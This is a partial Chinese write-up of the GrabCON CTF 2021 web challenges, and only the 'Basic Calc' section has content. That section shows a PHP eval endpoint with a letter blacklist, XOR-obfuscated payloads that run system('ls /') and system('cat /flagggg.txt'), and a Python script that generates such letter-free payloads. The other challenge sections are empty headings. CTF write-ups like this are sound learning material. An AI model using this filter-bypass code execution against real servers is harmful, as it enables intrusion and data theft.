# 原创
：  GrabCON CTF 2021 Web

# GrabCON CTF 2021 Web

#### GrabCON CTF 2021 Web

## E4sy Pe4sy

### 题目描述

> 



### 解题思路

> 



## Door Lock

### 题目描述

> 



### 解题思路

> 



## Basic Calc

### 题目描述

> 



### 解题思路

> 



```
&lt;h2&gt;Welcome to da Basic Calc&lt;/h2&gt;
&lt;form action="/" method="POST"&gt;
    Enter da equation : &lt;br&gt;
    &lt;input type="text" name="eq"&gt;&lt;br&gt;
&lt;/form&gt;

&lt;?php

if (isset($_POST["eq"])){
    
    $eq = $_POST["eq"];

    if(preg_match("/[A-Za-z`]+/",$eq)){
        die("BAD.");
    }
    echo "Result: ";
    eval("echo " . $eq . " ;");
}else{
  echo highlight_file('index.php',true);  
}

?&gt;

```

> 



> 



```
("system")("ls /")=(('3'^'@').('9'^'@').('3'^'@').('4'^'@').('8'^']').('2'^'_'))(('1'^']').('3'^'@').('^'^'~').'/')

```

> 



```
("system")("cat /flagggg.txt")=(('3'^'@').('9'^'@').('3'^'@').('4'^'@').('8'^']').('2'^'_'))(('8'^'[').('!'^'@').('4'^'@').('^'^'~').'/'.('8'^'^').('1'^']').('!'^'@').('8'^'_').('8'^'_').('8'^'_').('8'^'_').'.'.('4'^'@').('8'^'@').('4'^'@'))

```

> 



```
# string_code = ['system','ls /']
string_code = ['system','cat /flagggg.txt']
obfuscated_code = ""
charset = "1234567890!#$%&amp;'()*+/^,-.:;&lt;=&gt;?@[]_{|}~"

for code in string_code:
    obfuscated = ""
    for i in code:
        is_found_obfuscated = False
        for j in charset:
            for k in charset:
                if ord(j)^ord(k) == ord(i):
                    is_found_obfuscated = True
                    obfuscated += ".('%s'^'%s')" % (j, k)
                    #print("XOR ="+chr(ord(j)^ord(k)))
                if is_found_obfuscated:
                    break
            if is_found_obfuscated:
                break
        if not is_found_obfuscated:
            obfuscated += ".'%s'" % i
    #print("(%s) = (%s)" % (code, obfuscated[1:]))
    obfuscated_code += "(%s)" % obfuscated[1:]
print(''.join(["(\"%s\")" % i for i in string_code]) + '=' + obfuscated_code)

```

## Null Food Factory

### 题目描述

> 



### 解题思路

> 



> 


